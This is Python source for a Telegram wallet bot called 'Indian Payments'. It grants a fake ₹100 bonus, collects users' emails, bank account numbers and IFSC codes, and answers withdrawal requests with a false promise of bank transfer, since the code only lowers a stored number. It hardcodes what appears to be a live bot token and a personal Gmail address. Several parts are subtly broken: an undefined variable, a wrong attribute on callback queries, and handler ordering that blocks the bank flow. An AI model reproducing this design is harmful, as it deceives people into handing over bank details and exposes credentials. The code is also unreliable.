import os
import sqlite3
import random
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import (
    Application,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler
)

logging.basicConfig(level=logging.INFO)

TELEGRAM_BOT_TOKEN = "8881613181:AAHJWWzfD7N72LKGzCPIQRfEvO4XOSy2PE4"
WEBHOOK_URL = "https://indian-money-bot-amtk.onrender.com/webhook"

# Gmail SMTP Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SENDER_EMAIL = os.getenv("SENDER_EMAIL", "Chsandeep829@gmail.com")
SENDER_PASSWORD = os.getenv("SENDER_PASSWORD", "your_gmail_app_password")

app = FastAPI()

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            email TEXT,
            confirmation_code TEXT,
            is_verified INTEGER DEFAULT 0,
            balance REAL DEFAULT 100.0,
            bank_account TEXT,
            ifsc TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Initialize Telegram Application in Webhook mode
telegram_app = Application.builder().token(TELEGRAM_BOT_TOKEN).updater(None).build()

# Conversation States for Chat OTP fallback
CODE, BANK_ACC, BANK_IFSC, WITHDRAW_AMOUNT = range(4)

def get_user(telegram_id):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT email, is_verified, balance, bank_account, ifsc FROM users WHERE telegram_id = ?", (telegram_id,))
    user = cursor.fetchone()
    conn.close()
    return user

# --- Real Email Sender Function ---
def send_otp_email(receiver_email, code):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = receiver_email
        msg['Subject'] = "🔐 Your Wallet Verification Code"

        body = (
            f"Hello,\n\n"
            f"Your 6-digit confirmation code for your secure wallet login is: {code}\n\n"
            f"Please enter this code in the Telegram bot to verify your account.\n"
            f"If you did not request this, please ignore this email."
        )
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, receiver_email, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        logging.error(f"Failed to send email: {e}")
        return False

# --- FastAPI Web App Login Page Route ---
@app.get("/login-page", response_class=HTMLResponse)
async def login_page(telegram_id: int = 0):
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure Login</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body {{
                background-color: #0f172a;
                color: #f8fafc;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
                padding: 20px;
                box-sizing: border-box;
            }}
            .card {{
                background: #1e293b;
                padding: 24px;
                border-radius: 16px;
                width: 100%;
                max-width: 360px;
                box-shadow: 0 10px 25px rgba(0,0,0,0.3);
                text-align: center;
            }}
            h2 {{ margin-bottom: 8px; font-size: 22px; }}
            p {{ color: #94a3b8; font-size: 14px; margin-bottom: 24px; }}
            input {{
                width: 100%;
                padding: 12px;
                border-radius: 8px;
                border: 1px solid #334155;
                background: #0f172a;
                color: white;
                font-size: 15px;
                margin-bottom: 16px;
                box-sizing: border-box;
            }}
            .btn-google {{
                background: white;
                color: #1e293b;
                border: none;
                width: 100%;
                padding: 12px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 15px;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                margin-bottom: 12px;
            }}
            .btn-primary {{
                background: #2563eb;
                color: white;
                border: none;
                width: 100%;
                padding: 12px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 15px;
                cursor: pointer;
            }}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>🇮🇳 Indian Payments</h2>
            <p>Sign in securely to access your wallet</p>
            
            <button class="btn-google" onclick="fillGoogleDemo()">
                <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.23 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.14 0 9.87 0 11.75s.43 3.61 1.18 5.13l4.09-2.64z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
                Continue with Google
            </button>
            
            <div style="margin: 15px 0; color: #64748b; font-size: 13px;">or enter email manually</div>
            
            <input type="email" id="emailInput" placeholder="name@gmail.com">
            <button class="btn-primary" onclick="submitEmail()">Send Verification OTP</button>
        </div>

        <script>
            let tg = window.Telegram.WebApp;
            tg.expand();

            function fillGoogleDemo() {{
                // Automatically grab user details if available or prompt
                let email = prompt("Enter your Google Account email:", "Chsandeep829@gmail.com");
                if (email) {{
                    document.getElementById('emailInput').value = email;
                    submitEmail();
                }}
            }}

            function submitEmail() {{
                let email = document.getElementById('emailInput').value.trim();
                if (!email || !email.includes('@')) {{
                    alert('Please enter a valid email address');
                    return;
                }}
                // Send data back to Telegram bot
                tg.sendData(JSON.stringify({{ action: "login_email", email: email }}));
                tg.close();
            }}
        </script>
    </body>
    </html>
    """

# --- Main Dashboard UI ---
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)

    if not user:
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO users (telegram_id, balance) VALUES (?, ?)", (user_id, 100.0))
        conn.commit()
        conn.close()
        user = get_user(user_id)

    is_verified = user[1]
    balance = user[2]
    bank = user[3] or "Not Linked"

    webapp_url = f"{WEBHOOK_URL.replace('/webhook', '')}/login-page?telegram_id={user_id}"

    if not is_verified:
        text = (
            f"🇮🇳 **Indian Payments Bot**\n\n"
            f"Buy, sell, store, and manage your INR wallet seamlessly.\n\n"
            f"⚠️ **Account Status:** Unverified\n"
            f"Click below to open the secure login page."
        )
        keyboard = [
            [InlineKeyboardButton("🔐 Open Login Page", web_app=WebAppInfo(url=webapp_url))],
            [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
        ]
    else:
        text = (
            f"🇮🇳 **Indian Payments Wallet**\n\n"
            f"₹ **{balance:.2f}**\n"
            f"Total balance in INR\n\n"
            f"🏦 **Bank:** {bank}"
        )
        keyboard = [
            [InlineKeyboardButton("💼 Wallet", callback_data="wallet_menu"), InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_money")],
            [InlineKeyboardButton("📥 Add/Update Bank", callback_data="add_bank"), InlineKeyboardButton("📜 History", callback_data="history")],
            [InlineKeyboardButton("⚙️ Settings", callback_data="settings"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")]
        ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main_menu(update, context)

async def wallet_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_main_menu(update, context)

async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.effective_user.id
    user = get_user(user_id)
    
    email = user[0] or "Not Linked"
    verified = "✅ Verified" if user[1] else "❌ Unverified"
    webapp_url = f"{WEBHOOK_URL.replace('/webhook', '')}/login-page?telegram_id={user_id}"

    text = (
        f"⚙️ **Account Settings**\n\n"
        f"📧 **Email:** {email}\n"
        f"🔒 **Status:** {verified}\n\n"
        f"Manage your account preferences below:"
    )
    keyboard = [
        [InlineKeyboardButton("🔐 Change Account / Login", web_app=WebAppInfo(url=webapp_url))],
        [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]
    ]
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def history_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    text = (
        f"📜 **Transaction History**\n\n"
        f"• Welcome Bonus: +₹100.00 (Completed)\n"
        f"No other recent transactions."
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]
    await query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")

# --- Handle Web App Data (When user submits email from the Web Page) ---
async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import json
    data_str = update.message.web_app_data.data
    user_id = update.effective_user.id

    try:
        data = json.loads(data_str)
        if data.get("action") == "login_email":
            email = data.get("email")
            code = str(random.randint(100000, 999999))
            
            success = send_otp_email(email, code)
            if not success:
                await update.message.reply_text("❌ Failed to send email. Check your SMTP configuration.")
                return

            conn = sqlite3.connect("bot_database.db")
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET email = ?, confirmation_code = ? WHERE telegram_id = ?", (email, code, user_id))
            conn.commit()
            conn.close()

            context.user_data['awaiting_otp'] = True
            await update.message.reply_text(
                f"📧 A real confirmation code has been sent to **{email}** from the web page.\n\nPlease enter the 6-digit code here in chat:",
                parse_mode="Markdown"
            )
    except Exception as e:
        logging.error(f"Error parsing web app data: {e}")

async def verify_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_otp'):
        return

    entered_code = update.message.text.strip()
    user_id = update.effective_user.id

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT confirmation_code FROM users WHERE telegram_id = ?", (user_id,))
    row = cursor.fetchone()

    if row and row[0] == entered_code:
        cursor.execute("UPDATE users SET is_verified = 1 WHERE telegram_id = ?", (user_id,))
        conn.commit()
        conn.close()
        context.user_data['awaiting_otp'] = False
        await update.message.reply_text("✅ Login successful! Your account is verified.")
        await show_main_menu(update, context)
    else:
        conn.close()
        await update.message.reply_text("❌ Invalid code. Please enter the correct 6-digit confirmation code:")

# --- Bank & Withdrawal Conversations ---
BANK_ACC, BANK_IFSC, WITHDRAW_AMOUNT = range(3)

async def start_add_bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Please enter your **Bank Account Number**:", parse_mode="Markdown")
    return BANK_ACC

async def receive_bank_acc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bank_acc'] = update.message.text.strip()
    await update.message.reply_text("Please enter your bank's **IFSC Code** (e.g., HDFC0001234):", parse_mode="Markdown")
    return BANK_IFSC

async def receive_ifsc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ifsc = update.message.text.strip().upper()
    bank_acc = context.user_data.get('bank_acc')
    user_id = update.effective_user.id

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET bank_account = ?, ifsc = ? WHERE telegram_id = ?", (bank_acc, ifsc, user_id))
    conn.commit()
    conn.close()

    await update.message.reply_text("✅ Bank account successfully linked!")
    await show_main_menu(update, context)
    return ConversationHandler.END

async def start_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.effective_user.id
    user = get_user(user_id)
    bank_account = user[3]

    if not bank_account:
        await query.message.reply_text("⚠️ Please add your bank account first before requesting a withdrawal.")
        return ConversationHandler.END

    balance = user[2]
    await query.message.reply_text(
        f"💸 Enter the amount you wish to withdraw in INR (Available: ₹{balance:.2f}):",
        parse_mode="Markdown"
    )
    return WITHDRAW_AMOUNT

async def process_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number for the amount:")
        return WITHDRAW_AMOUNT

    user_id = update.effective_user.id
    user = get_user(user_id)
    balance = user[2]

    if amount <= 0:
        await update.message.reply_text("❌ Amount must be greater than zero.")
        return WITHDRAW_AMOUNT

    if amount > balance:
        await update.message.reply_text(f"❌ Insufficient balance. Your available balance is ₹{balance:.2f}.")
        return WITHDRAW_AMOUNT

    new_balance = balance - amount
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = ? WHERE telegram_id = ?", (new_balance, user_id))
    conn.commit()
    conn.close()

    await update.message.reply_text(
        f"✅ Withdrawal request of **₹{amount:.2f}** submitted successfully!\n"
        f"Funds will be transferred to your registered bank account within 24 working hours.\n\n"
        f"Remaining Balance: ₹{new_balance:.2f}",
        parse_mode="Markdown"
    )
    
    await show_main_menu(update, context)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

# Register Handlers
bank_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(start_add_bank, pattern="^add_bank$")],
    states={
        BANK_ACC: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_bank_acc)],
        BANK_IFSC: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ifsc)]
    },
    fallbacks=[CommandHandler("cancel", cancel)]
)

withdraw_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(start_withdrawal, pattern="^withdraw_money$")],
    states={
        WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal)]
    },
    fallbacks=[CommandHandler("cancel", cancel)]
)

telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CallbackQueryHandler(show_main_menu, pattern="^main_menu$"))
telegram_app.add_handler(CallbackButton := CallbackQueryHandler(wallet_menu, pattern="^wallet_menu$"))
telegram_app.add_handler(CallbackQueryHandler(show_main_menu, pattern="^refresh_wallet$"))
telegram_app.add_handler(CallbackQueryHandler(settings_menu, pattern="^settings$"))
telegram_app.add_handler(CallbackQueryHandler(history_menu, pattern="^history$"))
telegram_app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, verify_code))
telegram_app.add_handler(bank_conv)
telegram_app.add_handler(withdraw_conv)

@app.on_event("startup")
async def startup_event():
    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(url=WEBHOOK_URL)

@app.post("/webhook")
async def telegram_webhook(request: Request):
    data = await request.json()
    update = Update.de_json(data, telegram_app.bot)
    await telegram_app.process_update(update)
    return {"status": "ok"}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 10000))
    uvicorn.run("bot:app", host="0.0.0.0", port=port)
